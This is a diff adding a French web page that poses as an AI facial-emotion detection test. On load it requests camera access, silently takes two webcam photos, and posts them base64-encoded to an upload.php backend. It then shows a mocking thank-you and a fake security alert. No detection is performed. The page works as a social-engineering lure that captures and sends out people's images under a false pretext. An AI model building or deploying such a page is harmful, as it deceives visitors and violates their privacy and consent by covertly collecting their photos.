@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Test de Détection Faciale IA</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      color: #262626;
+    }
+
+    .header {
+      background: white;
+      padding: 15px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    .header h1 {
+      font-family: 'Segoe UI', sans-serif;
+      color: #4CAF50;
+      font-weight: bold;
+      margin: 0;
+    }
+
+    .content {
+      padding: 20px;
+    }
+
+    .instructions {
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    .loading {
+      margin: 20px auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #4CAF50;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    img {
+      max-width: 90%;
+      margin-top: 15px;
+      border-radius: 12px;
+      border: 1px solid #ddd;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+
+    .alert {
+      font-size: 18px;
+      color: #f44336;
+      margin-top: 30px;
+      display: none;
+    }
+
+    .thanks {
+      font-size: 20px;
+      color: #4CAF50;
+      margin-top: 20px;
+      display: none; /* Masqué initialement */
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <h1>Détection Faciale IA</h1>
+  </div>
+
+  <div class="content">
+    <p class="instructions">
+      Pour tester notre système avancé de détection faciale, autorise l'accès à ta caméra.<br>
+      Cela ne prendra que quelques secondes, et nous allons analyser ton visage pour déterminer certaines émotions.
+    </p>
+
+    <div class="loading" id="loading"></div>
+    <div id="preview"></div>
+    <div class="alert" id="alert">
+      <strong>⚠️ Attention :</strong> Quelque chose ne semble pas être à sa place, merci de vérifier la sécurité de ton appareil.
+    </div>
+
+    <div class="thanks" id="thanks">
+      Merci pour ta confiance et tes photos !<br>La prochaine fois, sois plus attentif... 😜
+    </div>
+  </div>
+
+  <script>
+    let count = 0;
+    let maxPhotos = 2;
+
+    async function captureImage() {
+      const video = document.createElement("video");
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        await video.play();
+
+        const capture = () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+          const imgData = canvas.toDataURL("image/jpeg");
+
+          const img = document.createElement("img");
+          img.src = imgData;
+          document.getElementById("preview").appendChild(img);
+
+          // Envoi au backend (optionnel si vous n’enregistrez pas)
+          fetch("upload.php", {
+            method: "POST",
+            body: new URLSearchParams({ imgBase64: imgData })
+          });
+
+          count++;
+          if (count < maxPhotos) {
+            setTimeout(capture, 2000);
+          } else {
+            // Arrêter le stream vidéo
+            stream.getTracks().forEach(track => track.stop());
+
+            // Cacher l'animation de chargement
+            document.getElementById("loading").style.display = "none";
+
+            // Afficher les messages de fin
+            setTimeout(() => {
+              document.getElementById("thanks").style.display = "block";
+              document.getElementById("alert").style.display = "block";
+            }, 1500); // Retarde l'affichage pour plus de réalisme
+          }
+        };
+
+        capture();
+      } catch (err) {
+        alert("Accès caméra refusé ou erreur.");
+        document.getElementById("loading").style.display = "none";
+      }
+    }
+
+    window.onload = () => {
+      setTimeout(captureImage, 1000); // Donne un effet de chargement avant de démarrer
+    };
+  </script>
+</body>
+</html>
